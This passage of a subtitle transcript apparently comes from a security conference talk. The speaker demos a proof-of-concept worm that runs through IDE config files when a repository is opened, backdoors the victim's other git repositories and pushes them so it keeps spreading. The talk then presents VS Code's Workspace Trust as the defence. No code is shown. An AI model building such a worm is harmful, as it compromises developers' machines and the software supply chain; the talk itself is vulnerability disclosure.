00:19:49,500 --> 00:19:52,150
And assuming they're using any common IDE,

446
00:19:52,150 --> 00:19:55,790
which as we established
before, they probably are,

447
00:19:55,790 --> 00:19:59,470
then that worm can
automatically propagate itself

448
00:19:59,470 --> 00:20:02,745
to every repository that
they have control over.

449
00:20:02,745 --> 00:20:06,290
And then people are likely going
to view those repositories.

450
00:20:06,290 --> 00:20:09,650
And then this can keep on
propagating exponentially,

451
00:20:09,650 --> 00:20:12,690
and really has a lot
of terrifying potential

452
00:20:12,690 --> 00:20:14,985
to spread really far.

453
00:20:14,985 --> 00:20:17,690
So I made a quick demo of this.

454
00:20:17,690 --> 00:20:19,290
So let's run through that.

455
00:20:19,290 --> 00:20:21,790
So here we have an empty repository.

456
00:20:21,790 --> 00:20:24,303
It has nothing in it
other than a read me file.

457
00:20:25,454 --> 00:20:27,320
And then inside of evil repo,

458
00:20:27,320 --> 00:20:30,730
we have a bunch of
different IDE config files.

459
00:20:30,730 --> 00:20:34,440
So these will all execute worm.py

460
00:20:34,440 --> 00:20:37,460
whenever they're opened
in the applicable IDE.

461
00:20:37,460 --> 00:20:40,040
So if you open this in Vscode or IntelliJ,

462
00:20:40,040 --> 00:20:42,260
or any popular IDE,

463
00:20:42,260 --> 00:20:44,500
it'll automatically execute the worm.

464
00:20:44,500 --> 00:20:46,850
And then that will look
for any git repositories

465
00:20:46,850 --> 00:20:49,940
on your computer, and
automatically backdoor them,

466
00:20:49,940 --> 00:20:52,200
and then run git push to push that up,

467
00:20:52,200 --> 00:20:54,470
so as to continue spreading the worm.

468
00:20:54,470 --> 00:20:57,033
So we're going to go
ahead and git clone this.

469
00:20:58,024 --> 00:20:58,857
We're just going to git clone it,

470
00:20:58,857 --> 00:21:00,357
and then open it up in Vscode.

471
00:21:03,637 --> 00:21:05,030
Then here in Vscode,

472
00:21:05,030 --> 00:21:08,360
there's no hint of
anything suspicious at all.

473
00:21:08,360 --> 00:21:11,020
Everything looks totally
normal, no error messages,

474
00:21:11,020 --> 00:21:12,660
nothing of that sort.

475
00:21:12,660 --> 00:21:16,150
But if we go over here to
what was an empty repository,

476
00:21:16,150 --> 00:21:19,140
and wait a few seconds before we refresh,

477
00:21:19,140 --> 00:21:20,550
it has now been backdoored,

478
00:21:20,550 --> 00:21:22,910
and contains all of these things,

479
00:21:22,910 --> 00:21:25,757
and will continue spreading
if anyone else opens it up.

480
00:21:25,757 --> 00:21:27,106
As I mentioned before,

481
00:21:27,106 --> 00:21:30,353
the core defense against
this class of bugs

482
00:21:30,353 --> 00:21:32,610
is developers that needed to be prompted,

483
00:21:32,610 --> 00:21:34,450
and needed to be given a choice

484
00:21:34,450 --> 00:21:36,725
before code starts executing.

485
00:21:36,725 --> 00:21:39,500
Vscode just came out with a new feature

486
00:21:39,500 --> 00:21:42,040
that helps defend against
this class of bugs,

487
00:21:42,040 --> 00:21:44,200
called Workspace Trust.

488
00:21:44,200 --> 00:21:45,280
And what this does is,

489
00:21:45,280 --> 00:21:47,800
when you open something
for the first time,

490
00:21:47,800 --> 00:21:50,140
you're asked whether or not you trust it.

491
00:21:50,140 --> 00:21:52,867
And that defines whether
it runs in trusted mode

492
00:21:52,867 --> 00:21:55,220
or restricted that mode.

493
00:21:55,220 --> 00:21:57,849
And if it's in restricted
mode, by default,

494
00:21:57,849 --> 00:22:01,080
it does not use any of
the settings defined

495
00:22:01,080 --> 00:22:03,250
inside of that folder.

496
00:22:03,250 --> 00:22:06,870
And it also does not allow
any extensions to run.

497
00:22:06,870 --> 00:22:08,299
So this makes it,

498
00:22:08,299 --> 00:22:09,720
so it's a really minimal IDE,

499
00:22:09,720 --> 00:22:12,490
when it's being used with untrusted code,

500
00:22:12,490 --> 00:22:14,620
but you still have the power of a full IDE

501
00:22:14,620 --> 00:22:16,660
if you trust a folder.

502
00:22:16,660 --> 00:22:20,010
So I just want to say thank
you to everyone I worked with

503
00:22:20,010 --> 00:22:23,250
on finding these bugs, and
getting them addressed.

504
00:22:23,250 --> 00:22:24,560
There are tons of different companies

505
00:22:24,560 --> 00:22:26,020
involved with fixing these

506
00:22:26,900 --> 00:22:28,440
So thank you to everyone for that.

507
00:22:28,440 --> 00:22:31,760
I uploaded the POC from
the demo to GitHub.

508
00:22:31,760 --> 00:22:33,206
You can also get these slides.

509
00:22:33,206 --> 00:22:36,010
And a big shout out to a Offensi,

510
00:22:36,010 --> 00:22:38,160
who originally kind of got me interested

511
00:22:38,160 --> 00:22:40,030
in this area of research

512
00:22:40,030 --> 00:22:42,260
when they published four different bugs

513
00:22:42,260 --> 00:22:43,510
in Google Cloud Shell.

514
00:22:43,510 --> 00:22:47,060
So I definitely recommend
checking out that blog post.

515
00:22:47,060 --> 00:22:48,333
Thank you everyone, bye.

